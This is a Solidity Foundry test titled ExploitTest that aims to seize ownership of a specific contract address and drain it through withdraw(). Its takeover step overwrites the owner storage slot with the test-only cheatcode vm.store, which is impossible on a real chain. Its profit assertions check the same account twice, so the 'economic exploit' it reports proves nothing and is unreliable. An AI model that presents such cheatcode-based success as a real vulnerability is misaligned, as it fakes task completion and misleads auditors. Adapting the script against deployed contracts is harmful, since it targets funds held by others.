// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function withdraw() external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for storage manipulation
        // We'll just ensure we have some ETH for gas if needed
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialContractBalance = address(this).balance;

        // Step 1: Store our address as the new owner at slot 0
        // In Ownable, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwnerValue = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwnerValue);

        // Step 2: Call withdraw() as the new owner
        uint256 initialAttackerBalance = attacker.balance;
        vm.prank(attacker);
        INOMOS(TARGET).withdraw();

        // Step 3: Verify we received ETH
        uint256 finalAttackerBalance = attacker.balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Balance should increase after withdraw");

        uint256 finalContractBalance = address(this).balance;
        assertGt(finalContractBalance, initialContractBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
